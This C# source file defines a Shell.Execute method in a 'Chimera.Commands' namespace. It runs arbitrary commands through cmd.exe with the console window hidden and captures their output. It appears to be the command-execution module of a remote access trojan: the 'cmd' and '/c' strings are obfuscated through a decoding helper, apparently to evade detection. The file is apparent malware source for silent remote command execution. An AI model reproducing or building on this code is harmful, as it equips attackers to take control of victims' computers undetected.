using System;
using System.Diagnostics;

namespace Chimera.Commands
{
    public static class Shell
    {
        public static string Execute(string command)
        {
            try
            {
                if (string.IsNullOrEmpty(command))
                    return "No command specified";

                string sysDir  = Environment.GetFolderPath(Environment.SpecialFolder.System);
                string cmdPath = System.IO.Path.Combine(sysDir, StringHelper.Decode(StringHelper.CMD));

                var psi = new ProcessStartInfo
                {
                    FileName  = cmdPath,
                    Arguments = StringHelper.Decode(StringHelper.SLASH_C) + " " + command,
                    RedirectStandardOutput = true,
                    RedirectStandardError  = true,
                    UseShellExecute        = false,
                    CreateNoWindow         = true,
                    WorkingDirectory       = sysDir
                };

                using (var proc = Process.Start(psi))
                {
                    string stdout = proc.StandardOutput.ReadToEnd();
                    string stderr = proc.StandardError.ReadToEnd();
                    proc.WaitForExit();

                    string result = stdout;
                    if (!string.IsNullOrEmpty(stderr))
                        result += "\n[stderr]\n" + stderr;

                    return string.IsNullOrEmpty(result) ? "(no output)" : result;
                }
            }
            catch (Exception ex)
            {
                return "[error] " + ex.Message;
            }
        }
    }
}
